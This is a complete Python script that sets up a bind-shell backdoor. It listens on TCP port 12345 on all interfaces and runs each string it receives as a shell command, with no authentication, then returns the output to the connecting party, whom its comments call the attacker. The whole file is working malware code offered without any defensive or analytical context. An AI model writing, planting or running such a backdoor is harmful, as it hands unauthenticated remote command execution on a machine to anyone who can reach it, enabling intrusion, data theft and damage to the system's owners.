import socket
import subprocess

def start_backdoor():
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', 12345))  # Bind to all interfaces on port 12345
    s.listen(5)
    print("Backdoor listening on port 12345")

    while True:
        # Wait for a connection
        conn, addr = s.accept()
        print(f"Connected by {addr}")

        with conn:
            while True:
                # Receive the next command from the attacker
                data = conn.recv(1024)
                if not data:
                    break
                command = data.decode('utf-8')
                print(f"Received command: {command}")

                # Execute the command
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr

                # Send the output back to the attacker
                conn.sendall(output.encode('utf-8'))

if __name__ == "__main__":
    start_backdoor()